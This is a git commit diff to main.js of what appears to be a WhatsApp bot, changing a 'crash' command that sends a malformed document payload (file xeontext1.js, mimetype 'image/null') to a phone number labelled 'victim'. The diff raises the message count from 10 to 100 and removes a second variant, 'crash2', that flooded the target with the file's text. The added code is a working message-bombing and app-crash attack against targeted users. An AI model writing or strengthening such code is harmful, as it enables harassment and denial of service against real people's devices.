8252325d3c9af210e2cccec4bbbe62902992827b
wantedasa <samuelweiland0@gmail.com>
2026-04-03 03:24:51 +0200

    .

--- main.js
+++ main.js
@@ -509,14 +509,14 @@ if (command === "crash") {
     }
 
     const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    const amount = 10;
+    const amount = 100;
 
     async function XeonyCrashy(name, chat) {
         await sock.sendMessage(chat, {
             document: { url: "./xeontext1.js" },
             mimetype: "image/null",
             fileName: `xeontext1.js`,
-            caption: `᭙ꪖ᭢ᡶꫀᦔꪖకꪖ`
+            caption: `crash by ᭙ꪖ᭢ᡶꫀᦔꪖకꪖ`
         });
     }
 
@@ -525,38 +525,6 @@ if (command === "crash") {
     }
 
     reply(sock, msg, `✅ Erfolgreich ${amount} Nachrichten an ${victim} gesendet`);
-}
-if (command === "crash2") {
-    if (!isWantedasa(sender)) {
-        return reply(sock, msg, "❌ Nur Owner dürfen diesen Command nutzen!");
-    }
-
-    if (!args[0]) {
-        return reply(sock, msg, `❌ Nutzung: ${prefix}crash 49123456789`);
-    }
-
-    const victim = args[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
-    const amount = 10;
-
-    // absoluter Pfad zur Datei
-    const filePath = path.join(process.cwd(), "./main/Wantedasa/wantedbot/xeontext1.js");
-
-    if (!fs.existsSync(filePath)) {
-        return reply(sock, msg, "❌ Datei nicht gefunden!");
-    }
-
-    const fileContent = fs.readFileSync(filePath, "utf-8");
-
-    async function XeonyCrashy(chat) {
-        await sock.sendMessage(chat, {
-            text: fileContent
-        });
-    }
-
-    for (let i = 0; i < amount; i++) {
-        await XeonyCrashy(victim);
-    }
-    reply(sock, msg, `✅ Inhalt ${amount}x an ${victim} gesendet`);
 }
 if (command === "getpic") {
     try {
